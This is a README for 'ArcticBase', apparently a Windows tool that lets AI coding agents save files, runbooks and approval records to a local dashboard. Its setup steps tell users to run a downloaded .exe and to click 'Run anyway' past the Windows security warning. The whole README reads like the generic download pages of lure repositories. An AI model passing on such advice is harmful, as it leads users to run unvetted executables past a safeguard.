# 🧊 ArcticBase - Manage Your AI Agent Projects Easily

[![](https://img.shields.io/badge/Download_ArcticBase-blue)](https://github.com/aluwu15/ArcticBase/releases)

ArcticBase acts as a central home for your AI coding agent projects. When you work with AI to write code, your tasks often scatter across chat windows. ArcticBase keeps these items in one place. Each project has a personal dashboard. Your AI agent saves approval forms, procedure guides, code files, and review documents here. This system keeps history permanent and easy to find.

## ⚙️ System Requirements

To run ArcticBase on Windows, ensure your computer meets these basic needs:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 200 megabytes of free disk space.
*   Connection: An active internet connection for initial setup.

You do not need to install complex coding software. ArcticBase runs as a standalone program.

## 📥 Get ArcticBase

Follow these steps to download the software:

1. Visit the [official release page](https://github.com/aluwu15/ArcticBase/releases).
2. Look for the latest version at the top of the list.
3. Click the file ending in `.exe` to start your download.
4. Once the download finishes, locate the file in your Downloads folder.

## 🚀 Installation and Setup

1. Double-click the ArcticBase `.exe` file you downloaded.
2. Windows might show a security window. Click "More info" and then "Run anyway" if the system asks.
3. A command window will open. Do not close this window while the program runs. It acts as the engine for your dashboard.
4. Open your web browser. 
5. Type `http://localhost:8000` into the address bar and press Enter.
6. The ArcticBase dashboard will appear on your screen.

## 🖥️ Using Your Dashboard

The dashboard organizes your work into individual projects. Follow these steps to use the interface:

1. Create a Project: Click the "New Project" button on the main screen. Give your project a name that relates to your goal.
2. Agent Integration: You can point your AI coding agent to the URL provided by your dashboard. The agent will then know where to save its reports and files.
3. Reviewing Documents: Each project view shows tabs for Files, Runbooks, and Approvals. Click these tabs to see the latest updates from your agent.
4. Audit History: If you need to see what happened yesterday or last week, click the "History" tab inside any project to view logs of agent actions.

## 📁 Managing Your Data

ArcticBase saves data directly to a folder on your computer. This ensures you keep control of your files. You can back up your work by copying the data folder to an external drive or cloud storage service. 

- To find your data, look in the folder where you placed the ArcticBase application.
- Look for a folder named `data`. This folder contains all projects, documents, and settings.

## 🛡️ Security and Privacy

ArcticBase runs locally on your computer. Your files stay on your machine. The program does not send your private data to a central cloud server. This setup provides a private environment for sensitive code projects. You control access to the workbench, and your documents remain within your local storage.

## 🛠️ Common Questions

**Does ArcticBase work offline?**
Yes. Once you open the application, it runs entirely on your local machine. You do not need the internet to view or organize files within your dashboard.

**Can I run multiple agents?**
Yes. You can create as many projects as you need. Each project functions as a separate space for different coding tasks or different AI agents.

**How do I update the software?**
When a new version releases, visit the download page again. Close your existing ArcticBase program, download the new file, and replace the old one. Your data stays in the `data` folder and remains safe during this update process.

**What happens if I close the black window?**
Closing the black command window stops the application. Your dashboard will stop working until you start the program again. Always keep this window open while you actively use the dashboard.

**Is my data lost if I delete the application?**
The program keeps your data in a separate folder. If you only delete the executable file, your projects remain in the data folder. However, it is always wise to make a backup before removing any program files.

## 🔧 Troubleshooting

If the dashboard does not load in your browser:

1. Check that the black command window is still open. 
2. Ensure you typed `http://localhost:8000` exactly into your browser.
3. If you still see an error, restart the ArcticBase program.
4. Make sure no other program on your computer uses the port number 8000. 

For further assistance, you can view the community discussions on the main GitHub repository page. The community often shares tips on optimizing agent connections and project workflows.
